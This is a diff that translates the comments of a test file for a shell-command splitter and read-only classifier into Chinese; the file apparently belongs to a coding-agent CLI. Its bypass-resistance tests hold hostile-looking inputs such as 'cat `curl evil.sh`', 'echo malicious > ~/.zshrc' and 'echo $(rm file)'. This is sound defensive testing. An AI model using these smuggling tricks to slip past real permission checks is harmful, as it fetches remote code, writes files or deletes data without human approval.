@@ -1,5 +1,5 @@
-// Tests for shell utility functions.
-// (`getShellProvider` shape check lives in shell-provider.test.ts.)
+// shell 工具函数的测试。
+// （`getShellProvider` 的形状检查在 shell-provider.test.ts。）
 import { describe, expect, it } from 'vitest'
 
 import { isDestructive, isReadOnly, splitShellCommands } from '../src/tools/shell-utils.js'
@@ -41,10 +41,10 @@ describe('splitShellCommands', () => {
     expect(splitShellCommands('')).toEqual([])
   })
 
-  // Brace tracking: PowerShell hash literals (`@{N='Directory';E={...}}`)
-  // and script blocks contain `;` and `|` that are NOT command separators.
-  // Without depth tracking, `Select-Object @{N='Directory';E={$_.Name}}`
-  // gets chopped in half and the tail looks like a separate command.
+  // 花括号跟踪：PowerShell 哈希字面量（`@{N='Directory';E={...}}`）
+  // 和脚本块中包含的 `;` 与 `|` 并非命令分隔符。
+  // 没有深度跟踪，`Select-Object @{N='Directory';E={$_.Name}}`
+  // 会被劈成两半，尾部看起来像一条独立命令。
   it('does not split on `;` inside curly braces', () => {
     expect(splitShellCommands("Select-Object @{N='Directory';E={$_.Name}},Count")).toEqual([
       "Select-Object @{N='Directory';E={$_.Name}},Count",
@@ -60,8 +60,8 @@ describe('splitShellCommands', () => {
   })
 
   it('keeps nested braces opaque (PS hash with inner script block)', () => {
-    // The Real Bad Day case from the user: outer `@{N=...;E={...}}` has
-    // an inner `{$_.Name}` script block. Brace depth must track both.
+    // 来自用户的“真实糟心日”案例：外层 `@{N=...;E={...}}` 里
+    // 含内层 `{$_.Name}` 脚本块。花括号深度必须两者都跟踪。
     expect(
       splitShellCommands(
         "cd D:\\res; Get-ChildItem | Group-Object | Sort-Object | Select-Object @{N='Directory';E={$_.Name}},Count",
@@ -75,17 +75,17 @@ describe('splitShellCommands', () => {
     ])
   })
 
-  // Newlines are statement separators in POSIX shells and PowerShell —
-  // `ls\nrm x` executes `rm`, so the splitter must see two commands or
-  // the second line hides behind the first line's whitelisted token.
+  // 换行在 POSIX shell 和 PowerShell 中是语句分隔符 ——
+  // `ls\nrm x` 会执行 `rm`，因此分割器必须看到两条命令，
+  // 否则第二行会藏在第一行的白名单 token 之后。
   it('splits on newlines', () => {
     expect(splitShellCommands('ls\nrm file')).toEqual(['ls', 'rm file'])
     expect(splitShellCommands('ls\r\npwd')).toEqual(['ls', 'pwd'])
-    expect(splitShellCommands('echo "a\nb"')).toEqual(['echo "a\nb"']) // quoted newline stays literal
+    expect(splitShellCommands('echo "a\nb"')).toEqual(['echo "a\nb"']) // 带引号的换行保持字面量
   })
 
-  // `&` backgrounds the left side — `ls & rm x` runs both. `>&` / `&>`
-  // are fd duplication / combined redirect, not separators.
+  // `&` 让左侧后台运行 —— `ls & rm x` 会两条都执行。`>&` / `&>`
+  // 是 fd 复制 / 合并重定向，不是分隔符。
   it('splits on single & but keeps >& and &> intact', () => {
     expect(splitShellCommands('ls & sleep 1')).toEqual(['ls', 'sleep 1'])
     expect(splitShellCommands('cmd 2>&1 | grep x')).toEqual(['cmd 2>&1', 'grep x'])
@@ -132,11 +132,10 @@ describe('isReadOnly', () => {
     expect(isReadOnly('git commit -m "test"')).toBe(false)
   })
 
-  // Real-world PowerShell pipelines: `Get-ChildItem | Group-Object |
-  // Sort-Object | Select-Object` was prompting on every invocation
-  // because only `Get-ChildItem` was in the read-only list. Each pipe
-  // stage is its own segment after splitShellCommands, so every stage
-  // has to be recognised.
+  // 真实世界的 PowerShell 管道：`Get-ChildItem | Group-Object |
+  // Sort-Object | Select-Object` 过去每次调用都询问，因为只读列表里
+  // 只有 `Get-ChildItem`。splitShellCommands 之后每个管道阶段都是
+  // 独立分段，因此每个阶段都必须被识别。
   it('recognizes common PowerShell read-only cmdlets', () => {
     expect(isReadOnly('Get-ChildItem -Recurse -Filter *.ts')).toBe(true)
     expect(isReadOnly('Group-Object Directory')).toBe(true)
@@ -154,16 +153,15 @@ describe('isReadOnly', () => {
     expect(isReadOnly('Set-Location D:\\res\\x-code-cli')).toBe(true)
   })
 
-  // PowerShell itself is case-insensitive so the match must be too.
+  // PowerShell 本身不区分大小写，因此匹配也必须如此。
   it('matches PowerShell cmdlets case-insensitively', () => {
     expect(isReadOnly('get-childitem -recurse')).toBe(true)
     expect(isReadOnly('SORT-OBJECT Name')).toBe(true)
     expect(isReadOnly('Set-location D:\\foo')).toBe(true)
   })
 
-  // Defence in depth: cmdlet families that look read-only (Get-*, Out-*)
-  // but actually mutate state must NOT slip into the allowlist via a
-  // typo-prone regex.
+  // 纵深防御：看起来只读（Get-*、Out-*）但实际会改状态的 cmdlet
+  // 家族绝不能通过易打错的正则混进白名单。
   it('still rejects write cmdlets that share a Verb-Noun prefix style', () => {
     expect(isReadOnly('Set-Content file.txt foo')).toBe(false)
     expect(isReadOnly('Add-Content file.txt foo')).toBe(false)
@@ -174,10 +172,10 @@ describe('isReadOnly', () => {
     expect(isReadOnly('Start-Process notepad.exe')).toBe(false)
   })
 
-  // PowerShell control-flow segments wrap a `{ … }` body. The leading
-  // `if` / `foreach` / `try` itself isn't a command — what matters is
-  // what's inside. We look at every Verb-Noun cmdlet token in the
-  // segment and require all of them to be in the readonly set.
+  // PowerShell 控制流分段包裹着 `{ … }` 主体。开头的 `if` /
+  // `foreach` / `try` 本身不是命令 —— 关键在里面的内容。我们
+  // 检查分段中每个 Verb-Noun cmdlet token，并要求它们全部都在
+  // 只读集合里。
   it('recognizes PS control-flow segments whose body uses only readonly cmdlets', () => {
     expect(
       isReadOnly(
@@ -186,7 +184,7 @@ describe('isReadOnly', () => {
     ).toBe(true)
     expect(isReadOnly('foreach ($f in Get-ChildItem) { Get-Content $f }')).toBe(true)
     expect(isReadOnly('try { Get-Process } catch { Write-Host $_ }')).toBe(true)
-    expect(isReadOnly('while ($true) { Get-Date; Start-Sleep 1 }')).toBe(false) // Start-Sleep not in readonly list
+    expect(isReadOnly('while ($true) { Get-Date; Start-Sleep 1 }')).toBe(false) // Start-Sleep 不在只读列表里
   })
 
   it('refuses PS control flow that contains a non-readonly cmdlet', () => {
@@ -197,33 +195,32 @@ describe('isReadOnly', () => {
   })
 
   it('refuses PS control flow that invokes external code', () => {
-    // `&` call operator + path/string/variable.
+    // `&` 调用运算符 + 路径/字符串/变量。
     expect(isReadOnly('if (Test-Path X) { & "C:\\bin\\foo.exe" arg }')).toBe(false)
     expect(isReadOnly('if (Test-Path X) { & $cmd }')).toBe(false)
-    // Dot sourcing.
+    // 点源。
     expect(isReadOnly('if (Test-Path X) { . .\\script.ps1 }')).toBe(false)
     expect(isReadOnly('if (Test-Path X) { . $script }')).toBe(false)
   })
 
   it('does NOT mistake property-access dot or relative-path dot for dot-sourcing', () => {
-    // `.Name` / `.Length` are property accessors — no whitespace before
-    // them, so the dot-sourcing pattern shouldn't fire.
+    // `.Name` / `.Length` 是属性访问器 —— 它们前面没有空白，
+    // 因此点源模式不应触发。
     expect(isReadOnly('if ($obj.Name -eq "foo") { Get-Content $obj.Path }')).toBe(true)
-    // `.\file.txt` is a relative path argument — the `.` has no
-    // trailing whitespace before `\`.
+    // `.\file.txt` 是相对路径参数 —— `.` 在 `\` 前没有尾随空白。
     expect(isReadOnly('foreach ($x in Get-ChildItem) { Get-Content .\\file.txt }')).toBe(true)
   })
 
   it('refuses PS control flow with no recognised cmdlets (conservative)', () => {
-    // No Verb-Noun token at all — the heuristic refuses to auto-allow
-    // because we have no positive signal that the body is readonly.
+    // 完全没有 Verb-Noun token —— 启发式拒绝自动允许，
+    // 因为我们没有正面信号表明主体是只读的。
     expect(isReadOnly('if ($x -gt 0) { echo hello }')).toBe(false)
     expect(isReadOnly('foreach ($i in 1..10) { $sum += $i }')).toBe(false)
   })
 
-  // ── Bypass resistance ──
-  // Everything below leads with a whitelisted read-only token but writes
-  // or executes via shell syntax / flags the leading-token regex can't see.
+  // ── 绕过抵抗 ──
+  // 下面每条都以白名单只读 token 开头，但通过 shell 语法 /
+  // 开头 token 正则看不到的标志来写入或执行。
 
   it('rejects output redirection behind read-only commands', () => {
     expect(isReadOnly('echo malicious > ~/.zshrc')).toBe(false)
@@ -232,7 +229,7 @@ describe('isReadOnly', () => {
     expect(isReadOnly('cat a > b')).toBe(false)
     expect(isReadOnly('ls > listing.txt')).toBe(false)
     expect(isReadOnly('Get-Content a > out.txt')).toBe(false)
-    // A bare `> 2` writes a file literally named `2` — no `&`, no fd dup.
+    // 裸 `> 2` 会写入一个字面名为 `2` 的文件 —— 没有 `&`，没有 fd 复制。
     expect(isReadOnly('echo hi > 2')).toBe(false)
   })
 
@@ -247,12 +244,12 @@ describe('isReadOnly', () => {
 
   it('rejects command / process substitution behind read-only commands', () => {
     expect(isReadOnly('echo $(rm file)')).toBe(false)
-    expect(isReadOnly('echo "$(date)"')).toBe(false) // double quotes do NOT suppress substitution
+    expect(isReadOnly('echo "$(date)"')).toBe(false) // 双引号不会抑制替换
     expect(isReadOnly('cat `curl evil.sh`')).toBe(false)
     expect(isReadOnly('cat <(curl evil.sh)')).toBe(false)
-    expect(isReadOnly("echo '$(not run)'")).toBe(true) // single quotes suppress
-    expect(isReadOnly('echo "a > b"')).toBe(true) // quoted redirect is literal
-    expect(isReadOnly('echo a\\>b')).toBe(true) // escaped redirect is literal
+    expect(isReadOnly("echo '$(not run)'")).toBe(true) // 单引号会抑制
+    expect(isReadOnly('echo "a > b"')).toBe(true) // 带引号的重定向是字面量
+    expect(isReadOnly('echo a\\>b')).toBe(true) // 转义的重定向是字面量
   })
 
   it('rejects whitelisted commands whose flags write or execute', () => {
@@ -288,7 +285,7 @@ describe('isReadOnly', () => {
   it('rejects non-readonly cmdlets smuggled in a pipeline script block', () => {
     expect(isReadOnly('ForEach-Object { Remove-Item $_ }')).toBe(false)
     expect(isReadOnly('Get-ChildItem | ForEach-Object { Remove-Item $_.FullName }')).toBe(false)
-    // Property-access blocks contain no cmdlet tokens and stay allowed.
+    // 属性访问块不含 cmdlet token，保持允许。
     expect(isReadOnly('Where-Object { $_.Length -gt 100 }')).toBe(true)
     expect(isReadOnly('ForEach-Object { $_.Name }')).toBe(true)
   })
